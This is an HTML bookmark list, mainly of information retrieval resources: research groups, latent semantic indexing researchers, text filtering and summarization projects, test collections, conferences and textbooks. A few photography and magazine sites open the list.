<DT><A HREF="http://members.optusnet.com.au/vaps/vaps.htm" ADD_DATE="1117155156" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">VAPS
                  - Victorian Association Of Photographic Societies</A>

<DT><A HREF="http://www.digicamera.com/" ADD_DATE="1122553929" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Digital
                    Photography</A>
<DT><A HREF="http://www.pcphotomag.com/" ADD_DATE="1100826601" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">PC
                  Photo Magazine</A>
<DT><A HREF="http://www.time.com/time/" ADD_DATE="1108355219" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Time
                  Magazine: Technology</A>
<DT><A HREF="http://www.choice.com.au/defaultView.aspx?id=102314&catId=100165" ADD_DATE="1112782876" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Choice
                  Magazine: Products</A>
<DT><A HREF="http://www.videocamera.com.au" ADD_DATE="1151438048" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Video
                  Camera Magazine</A>
<DT><A HREF="http://www.dpreview.com/" ADD_DATE="1137930142" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Digital
                  Photography Review</A>
<DT><A HREF="http://www.steves-digicams.com/default.htm" ADD_DATE="1105979889" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Steve's
                  Digicams</A>
<DT><A HREF="http://www.photoreview.com.au/" ADD_DATE="1136281286" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Photo
                  Review</A>
<DT><A HREF="http://www.acm.org/sigir/" ADD_DATE="1108225628" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	ACM SIGIR (Special Interest Group on Information Retrieval)</A>
<DT><A HREF="http://sdmc.iss.nus.sg/sigir-ap/" ADD_DATE="1113591431" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	SIGIR Asia Pacific Web Site</A>
<DT><A HREF="http://www-nlpir.nist.gov/" ADD_DATE="1100906522" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	NIST Natural Language Processing &amp; Information Retrieval Group Home Page</A>
<DT><A HREF="http://trec.nist.gov/" ADD_DATE="1108586062" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Text REtrieval (TREC) Home Page</A>

<DT><A HREF="http://irsg.eu.org/" ADD_DATE="1120599446" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	The British Computer Society,
	Information Retrieval Specialist Group</A>
<DT><A HREF="http://dcs.vein.hu/CIR/" ADD_DATE="1149259395" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Center for Information Retrieval (CIR), University of Veszprem</A>
<DT><A HREF="http://www.ir.iit.edu/" ADD_DATE="1158150471" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Information Retrieval Lab, Illinois Institute of Technology</A>
<DT><A HREF="http://ciir.cs.umass.edu/" ADD_DATE="1124363987" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	The Center for Intelligent Information Retrieval (CIIR)</A>
<DT><A HREF="http://amaunet.cs.uni-dortmund.de/ir/" ADD_DATE="1125025811" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">

	Information Systems Group, University of Dortmund, Germany</A>
<DT><A HREF="http://amaunet.cs.uni-dortmund.de/ir/reports/" ADD_DATE="1144682742" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
		Publications of the Chair for Information Retrieval</A>
<DT><A HREF="http://www.cs.kun.nl/is/research/filter/overview.html" ADD_DATE="1107098815" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Information Systems Group, University of Nijmegen</A>
<DT><A HREF="http://www.cedar.buffalo.edu/MMIR/" ADD_DATE="1133474889" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	M.M.I.R. research group at CEDAR, State University of New York at Buffalo</A>
<DT><A HREF="http://www.cedar.Buffalo.EDU/MMIR/resource/index.html" ADD_DATE="1123371751" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
		Resource Lists</A>

<DT><A HREF="http://www.almaden.ibm.com/cs/k53/clever.html" ADD_DATE="1112980966" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	The Clever Project</A>
<DT><A HREF="http://www.canis.uiuc.edu/projects/interspace/" ADD_DATE="1102996603" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Interspace Research Project</A>
<DT><A HREF="http://ils.unc.edu/iris/" ADD_DATE="1144058962" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	IRIS: Information Retrieval Interactive System</A>
<DT><A HREF="http://www-ai.ijs.si/DunjaMladenic/yplanet.html" ADD_DATE="1110462509" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Yahoo Planet</A>
<DT><A HREF="http://google.stanford.edu/" ADD_DATE="1108300741" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">

	Google Search Engine</A>
<DT><A HREF="http://cap.anu.edu.au/cap/projects/text_retrieval/" ADD_DATE="1138757858" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	PADRE text retrieval</A>
<DT><A HREF="http://pastime.anu.edu.au/TAR/" ADD_DATE="1132826614" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	TAR (Text and Associated Research) Project</A>
<DT><A HREF="http://www.research.digital.com/SRC/personal/Krishna_Bharat/WebArcheology/" ADD_DATE="1130291852" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	The Web Archeology Project</A>
<DT><A HREF="http://www.cs.cmu.edu/afs/cs.cmu.edu/project/theo-11/www/wwkb/" ADD_DATE="1131083056" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	CMU World Wide Knowledge Base project</A>

<DT><A HREF="http://www-uilots.let.uu.nl/~uplift/" ADD_DATE="1134499345" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Utrecht Project: Linguistic Information for Free Text Retrieval</A>
<DT><A HREF="http://www.public.iastate.edu/~CYBERSTACKS/Aristotle.htm" ADD_DATE="1115550818" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Project Aristotle(sm): Automated Categorization of Web Resources</A>
<DT><A HREF="http://robotics.Stanford.EDU/users/sahami/SONIA/SONIAproject.html" ADD_DATE="1140444478" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	SONIA Project</A>
<DT><A HREF="http://www.cs.bu.edu/groups/ivc/ImageRover/Home.html" ADD_DATE="1118961074" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	ImageRover</A>
<DT><A HREF="http://www2.links2go.com/topic/Information_Retrieval" ADD_DATE="1124556779" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">

	Links2Go: Information Retrieval</A>
<DT><A HREF="http://www.scils.rutgers.edu/~rieh/cir/" ADD_DATE="1142941525" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Information Resource Center for Information Retrieval</A>
<DT><A HREF="http://www.isi.edu/~muslea/RISE/index.html" ADD_DATE="1128664167" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	RISE: Repository of Online Information Sources Used in
	Information Extraction Tasks</A>
<DT><A HREF="http://www.mri.mq.edu.au/~einat/web_ir/" ADD_DATE="1146404188" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Web IR &amp; IE</A>

<DT><A HREF="http://ai.iit.nrc.ca/bibliographies/ml-applied-to-ir.html" ADD_DATE="1131450844" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Machine Learning Applied to Information Retrieval</A>
<DT><A HREF="http://web.soi.city.ac.uk/~andym/ir_groups.html" ADD_DATE="1136838652" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Information Retrieval URL's</A>
<DT><A HREF="http://www.alakhawayn.ma/~Y.Houmame/irlinks.html" ADD_DATE="1159944476" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Information Retrieval Links</A>
<DT><A HREF="http://www.alakhawayn.ma/~Y.Houmame/ir_groups.html" ADD_DATE="1132306224" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
		Information Retrieval Groups around the World</A>
<DT><A HREF="http://www-ir.inf.ethz.ch/ir_groups.html" ADD_DATE="1145373572" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">

	Information Retrieval Research Groups around the World</A>
<DT><A HREF="http://www.cs.jhu.edu/~weiss/" ADD_DATE="1120292779" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Scott Weiss' Home Page</A>
<DT><A HREF="http://www.cs.jhu.edu/~weiss/ir.html" ADD_DATE="1121314475" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
		Survey of Information Retrieval</A>
<DT><A HREF="http://www.cs.jhu.edu/~weiss/papers.html" ADD_DATE="1143272900" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
		Information Retrieval Papers</A>
<DT><A HREF="http://mansci1.uwaterloo.ca/~jjiang/biblio.html" ADD_DATE="1144605623" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	A Bibliography of my Information Retrieval Collection</A>

<DT><A HREF="http://mansci1.uwaterloo.ca/~jjiang/" ADD_DATE="1146289144" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Jay Jiang</A>
<DT><A HREF="http://www.bright.org.br./pfg/Review/ir/welcome.htm" ADD_DATE="1127704498" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Information Retrieval Bibliographies</A>
<DT><A HREF="http://web.syr.edu/~diekemar/ir.html" ADD_DATE="1151653296" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Information Retrieval Links</A>
<DT><A HREF="http://www.dcs.gla.ac.uk/idom/ir_resources/" ADD_DATE="1119512890" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Glasgow IDOM - IR resources</A>
<DT><A HREF="http://www.dcs.gla.ac.uk/idom/ir_resources/test_collections/" ADD_DATE="1151025107" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
		Test collections</A>

<DT><A HREF="http://www.iam.unibe.ch/~scg/Archive/Software/FreeDB/FreeDB.home.html" ADD_DATE="1104383118" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Free Database List</A>
<DT><A HREF="http://www.cs.utk.edu/~berry/sc95/sc95.html" ADD_DATE="1122458351" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Computational Methods for Intelligent Information Access</A>
<DT><A HREF="http://www.ee.umd.edu/medlab/mlir/" ADD_DATE="1134832926" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Cross-Language Information Retrieval Resources</A>
<DT><A HREF="http://www.kdnuggets.com/index.html" ADD_DATE="1114794485" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	KD Mine: Data Mining and Knowledge Discovery Resources Index</A>
<DT><A HREF="http://www.kdnuggets.com/tools.html" ADD_DATE="1130707950" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">

		Tools (Siftware) for Data Mining and Knowledge Discovery</A>
<DT><A HREF="http://www.cs.bham.ac.uk/~anp/TheDataMine.html" ADD_DATE="1113339640" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	The Data Mine - Data Mining and KDD information</A>
<DT><A HREF="http://www.cs.umbc.edu/~ian/research-bib.html" ADD_DATE="1147569956" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	IR and LSI Bibliography</A>
<DT><A HREF="http://www.ee.umd.edu/medlab/filter/filter_project.html" ADD_DATE="1100748658" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Information Filtering Project</A>
<DT><A HREF="http://www.ee.umd.edu/medlab/filter/filter.html" ADD_DATE="1144371553" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
		Information Filtering Resources</A>

<DT><A HREF="http://www.ee.umd.edu/medlab/filter/software.html" ADD_DATE="1121818158" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
		Freely Available Information Filtering Systems</A>
<DT><A HREF="http://www.cogsci.kun.nl/~profile/others.html" ADD_DATE="1116248334" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Profile - More on Information Filtering</A>
<DT><A HREF="http://www.dsv.su.se/~fk/if_Doc/IntFilter.html" ADD_DATE="1124564888" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Intelligent Message Filtering</A>
<DT><A HREF="http://ils.unc.edu/gants/filterbib.html" ADD_DATE="1140728089" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Information Filtering Bibliography</A>
<DT><A HREF="http://www.cs.kun.nl/is/research/filter/references.html" ADD_DATE="1140753970" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">

	Information Filtering Literature</A>
<DT><A HREF="ftp://ftp.cs.umd.edu/pub/hcil/Reports-Abstracts-Bibliography/3643html/filter.html" ADD_DATE="1107255269" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	A Conceptual Framework for Text Filtering</A>
<DT><A HREF="http://lsi.argreenhouse.com/~remde/lsi/" ADD_DATE="1109141112" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Telcordia Technologies Latent Semantic Indexing</A>
<DT><A HREF="http://lsi.argreenhouse.com/~remde/lsi/LSIpapers.html" ADD_DATE="1126907014" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
		LSI papers</A>
<DT><A HREF="http://www.cs.utk.edu/~lsi/" ADD_DATE="1138654971" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Latent Semantic Indexing</A>

<DT><A HREF="http://lsa.colorado.edu/" ADD_DATE="1145928622" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Latent Semantic Analysis</A>
<DT><A HREF="http://www.upmf-grenoble.fr/sciedu/blemaire/lsa.html" ADD_DATE="1126600347" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Readings in Latent Semantic Analysis for Cognitive Science and Education</A>
<DT><A HREF="http://psych.colorado.edu/~rehder/lsa.html" ADD_DATE="1110710051" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Knowledge Representation and Latent Semantic Analysis</A>
<DT><A HREF="http://maude.nmsu.edu/essay/index.html" ADD_DATE="1131051051" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Demonstration of Automatic Essay Grading with LSA</A>
<DT><A HREF="http://kf.oise.utoronto.ca/lsa/" ADD_DATE="1146841983" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">

	Latent Semantic Analysis of Knowledge Forum&#153; Databases</A>
<DT><A HREF="http://www.cse.ogi.edu/~mhereim/" ADD_DATE="1131973383" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Resources for Latent Semantic Indexing</A>
<DT><A HREF="http://www.cs.utk.edu/~berry/" ADD_DATE="1114072807" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
		Michael W. Berry</A>
<DT><A HREF="http://research.microsoft.com/~sdumais/" ADD_DATE="1131196463" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
		Susan Dumais</A>

<DT><A HREF="http://www.cse.psu.edu/~zha/" ADD_DATE="1118011384" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
		Hongyuan Zha</A>
<DT><A HREF="http://www.cs.brown.edu/people/th/" ADD_DATE="1141726163" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
		Thomas Hofmann</A>
<DT><A HREF="http://catarina.usc.edu/shli/" ADD_DATE="1122598615" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
		Shih-Hao Li</A>
<DT><A HREF="http://csmr.ca.sandia.gov/~tgkolda/" ADD_DATE="1137473131" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
		Tamara G. Kolda</A>
<DT><A HREF="http://www.cs.umd.edu/users/oleary/" ADD_DATE="1132500126" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">

		Dianne P. O'Leary</A>
<DT><A HREF="http://www-psych.nmsu.edu/~pfoltz/" ADD_DATE="1126930591" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
		Peter Foltz</A>
<DT><A HREF="http://www.cs.duke.edu/~mlittman/" ADD_DATE="1159880340" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
		Michael L. Littman</A>
<DT><A HREF="http://psych-www.colorado.edu/faculty/landauer.html" ADD_DATE="1107081908" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
		Thomas K. Landauer</A>
<DT><A HREF="http://www.cs.colorado.edu/~noah/" ADD_DATE="1141673933" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
		Noah Coccaro</A>

<DT><A HREF="http://http.cs.berkeley.edu/~christos/" ADD_DATE="1130337146" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
		Christos H. Papadimitriou</A>
<DT><A HREF="http://www.csd.uwo.ca/%7ejamie/" ADD_DATE="1120370406" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
		James Blustein</A>
<DT><A HREF="http://www.csee.umbc.edu/~ian/" ADD_DATE="1128992746" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
		Ian Soboroff</A>
<DT><A HREF="http://www.nersc.gov/~cding/" ADD_DATE="1131034661" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
		Chris H.Q. Ding</A>
<DT><A HREF="http://www.cs.berkeley.edu/~randit/cs267-project.lsi.html" ADD_DATE="1104490816" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">

		Parallizing the SVD Computation (Lanczos Algorithm) for
		Latent Semantic Indexing (LSI) of a Very Large, Sparse Matrix</A>
<DT><A HREF="http://www.cs.duke.edu/~mlittman/courses/Archive/INLS379/xlang/xlang.html" ADD_DATE="1150759761" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
		Cross-Language LSI</A>
<DT><A HREF="http://www-psych.nmsu.edu/~pfoltz/papers.html" ADD_DATE="1147231853" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
		Peter Foltz's recent papers</A>
<DT><A HREF="http://locutus.ucr.edu/abstracts/ab2.html" ADD_DATE="1129004561" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
		Using High-dimensional Semantic Spaces Derived from Large Text Corpora</A>
<DT><A HREF="http://www.vperson.com/mlm/sigir91.html" ADD_DATE="1131236707" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
		Retrieval Performance in FERRET: A Conceptual Information Retrieval System</A>

<DT><A HREF="http://sandbox.parc.xerox.com/gilbert/ppp/proposal.html" ADD_DATE="1127734679" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
		Portable Parallel Preconditioning</A>
<DT><A HREF="http://www.parc.xerox.com/istl/projects/ia/papers/cac-sigir97/sigir97.html" ADD_DATE="1136208688" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
		Cat-a-Cone: An Interactive Interface for Specifying
		Searches and Viewing Retrieval Results using a Large Category Hierarchy</A>
<DT><A HREF="http://www.firstmonday.dk/issues/issue2_3/jansen/index.html" ADD_DATE="1140326677" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
		Using an Intelligent Agent to Enhance Search Engine Performance</A>
<DT><A HREF="http://www.useit.com/papers/handwriting_retrieval.html" ADD_DATE="1154590551" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
		Information Retrieval of Imperfectly Recognized Handwriting</A>
<DT><A HREF="http://www.cpm.mmu.ac.uk/jom-emit/1997/vol1/best_ml.html" ADD_DATE="1114612515" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">

		Models for Interacting Populations of Memes: Competition and Niche Behavior</A>
<DT><A HREF="http://www.acm.org/sigchi/chi95/proceedings/intpost/pwd_bdy.htm" ADD_DATE="1126004155" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
		Improving Human-Proceedings Interaction: Indexing the CHI Index</A>
<DT><A HREF="http://www.pertinence.net/index_en.html" ADD_DATE="1120939754" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	PERTINENCE</A>
<DT><A HREF="http://www.site.uottawa.ca/tanka/ts.html" ADD_DATE="1125271423" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	The Text Summarization Project</A>
<DT><A HREF="http://www.cs.columbia.edu/~hjing/summarization.html" ADD_DATE="1157004063" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Summarization Resources</A>

<DT><A HREF="http://www.dcs.shef.ac.uk/~gael/summarization.html" ADD_DATE="1107530593" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	The Sheffield University Summarisation WWW Page</A>
<DT><A HREF="http://www.dcs.shef.ac.uk/~gael/alphalist.html" ADD_DATE="1157193664" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
		References related to Summarisation listed by Authors</A>
<DT><A HREF="http://www.cs.columbia.edu/~radev/summarization/" ADD_DATE="1110825727" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Summarization</A>
<DT><A HREF="http://www.isi.edu/natural-language/projects/SUMMARIST.html" ADD_DATE="1138675914" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	SUMMARIST: Automated Text Summarization</A>
<DT><A HREF="http://www.isi.edu/natural-language/summ-indic-phrases.html" ADD_DATE="1114953904" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">

		Indicator Phrase Package</A>
<DT><A HREF="http://www.ik.fh-hannover.de/ik/projekte/Dagstuhl/Abstract/" ADD_DATE="1152500747" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Summarizing Text for Intelligent Communication</A>
<DT><A HREF="http://extractor.iit.nrc.ca/" ADD_DATE="1101023385" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Extractor: Text Summarization Software</A>
<DT><A HREF="ftp://ftp.cs.cornell.edu/pub/smart/" ADD_DATE="1152375893" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Software and test collections</A>
<DT><A HREF="ftp://ftp.cs.cornell.edu/pub/smart/cran/" ADD_DATE="1124749730" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
		Cranfield collection</A>

<DT><A HREF="ftp://ftp.cs.cornell.edu/pub/smart/med/" ADD_DATE="1127902834" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
		Medlars collection</A>
<DT><A HREF="ftp://ftp.cs.cornell.edu/pub/smart/time/" ADD_DATE="1152005089" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
		Time magazine collection</A>
<DT><A HREF="http://pi0959.kub.nl:2080/Paai/Onderw/Smart/" ADD_DATE="1131780496" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	SMART: Tutorial for beginners</A>
<DT><A HREF="http://www.ee.umd.edu/~oard/software.html" ADD_DATE="1109325624" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Doug Oard's Research Software Page</A>
<DT><A HREF="http://www.dcs.gla.ac.uk/ftp/pub/Bruin/HTML/SMART.HTM" ADD_DATE="1122091092" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">

	SMART Related Documents</A>
<DT><A HREF="http://searchenginewatch.internet.com/resources/software.html" ADD_DATE="1152099759" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Search Engine Software For Your Web Site</A>
<DT><A HREF="http://lorca.compapp.dcu.ie/SIGIR98-wshop/program.html" ADD_DATE="1138267227" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	SIGIR'98 Workshop on Hypertext IR for the Web</A>
<DT><A HREF="http://www.webnetjrl.com/" ADD_DATE="1153074611" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	WebNet Journal: Internet Technologies, Applications &amp; Issues</A>

<DT><A HREF="http://trec.nist.gov/pubs.html" ADD_DATE="1156539432" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	TREC: Text REtrieval Conference</A>
<DT><A HREF="http://www3.cm.deakin.edu.au/apweb98/program.htm" ADD_DATE="1128775845" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Asia Pacific Web Conference (APWeb98)</A>
<DT><A HREF="http://www.acm.org/pubs/contents/proceedings/ir/" ADD_DATE="1140055320" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	SIGIR Conference Proceedings on Information Retrieval</A>
<DT><A HREF="http://www.iit.nrcps.ariadne-t.gr/~costass/mulsaic97.html" ADD_DATE="1125292850" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	The 2nd Workshop on Multilinguality in Software Industry:
	The AI Contribution (MULSAIC'97)</A>
<DT><A HREF="http://www.ee.umd.edu/medlab/filter/sss/papers/" ADD_DATE="1159961409" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">

	AAAI Spring Symposium on Cross-Language Text and Speech Retrieval
	Electronic Working Notes</A>
<DT><A HREF="http://ciir.cs.umass.edu/nir97/" ADD_DATE="1107538855" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	SIGIR-97 Workshop on Networked Information Retrieval</A>
<DT><A HREF="http://journals.ecs.soton.ac.uk/~lac/ht97/summary.html" ADD_DATE="1101250394" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Hypertext 97: Proceedings of The Eighth ACM Conference on Hypertext</A>
<DT><A HREF="http://proceedings.www6conf.org/" ADD_DATE="1140036942" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Sixth International World Wide Web Conference:
	Hyperproceedings</A>
<DT><A HREF="http://atlanta.cs.nchu.edu.tw/www/ToC.html" ADD_DATE="1101878262" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Sixth International World Wide Web Conference:
	Hyperproceedings</A>

<DT><A HREF="http://www5conf.inria.fr/" ADD_DATE="1115811766" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Fifth International World Wide Web Conference</A>
<DT><A HREF="http://www.supercomp.org/sc95/proceedings/" ADD_DATE="1105789954" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Proceedings of the 1995 ACM/IEEE Supercomputing Conference</A>
<DT><A HREF="http://ai.iit.nrc.ca/DEIL/" ADD_DATE="1122766874" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Workshop on Data Engineering for Inductive Learning</A>
<DT><A HREF="http://www-cse.ucsd.edu/users/rik/MLIA.html" ADD_DATE="1141032046" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Machine Learning and Information Retrieval</A>
<DT><A HREF="http://www.enst.fr/~rungsawa/irrs.html/" ADD_DATE="1102542874" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">

	Information Retrieval Reference System</A>
<DT><A HREF="http://ciir.cs.umass.edu/publications/index.shtml" ADD_DATE="1130246325" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Center for Intelligent Information Retrieval: Publications</A>
<DT><A HREF="http://www.cse.ucsd.edu/groups/guru/publications.html" ADD_DATE="1137974567" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	GURU Publications</A>
<DT><A HREF="http://www.ub2.lu.se/desire/radar/lit-about-search-services.html" ADD_DATE="1113317458" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Literature about search services</A>
<DT><A HREF="http://www.dcc.ufmg.br/irbook/" ADD_DATE="1108671095" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Modern Information Retrieval</A>

<DT><A HREF="http://sunsite.dcc.uchile.cl/irbook/" ADD_DATE="1152877329" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Chile mirror</A>
<DT><A HREF="http://www.sims.berkeley.edu/~hearst/irbook/" ADD_DATE="1105567062" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">USA mirror</A>
<DT><A HREF="http://www.cs.mu.OZ.AU/mg/" ADD_DATE="1109643338" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Managing Gigabytes: Compressing and Indexing Documents and Images</A>
<DT><A HREF="http://www.dcs.glasgow.ac.uk/Keith/Preface.html" ADD_DATE="1145002079" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
	Information Retrieval</A>
<DT><A HREF="http://sarvis.cs.vt.edu/~alonso/irbook/index.html" ADD_DATE="1130265649" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
		Source code</A>
<DT><A HREF="ftp://ftp.vt.edu/pub/reuse/IR.code/" ADD_DATE="1137495029" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">

		Source code</A>
<DT><A HREF="ftp://ftp.think.com/pub/wais/ir-book-sources/" ADD_DATE="1136756025" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
		Source code</A>
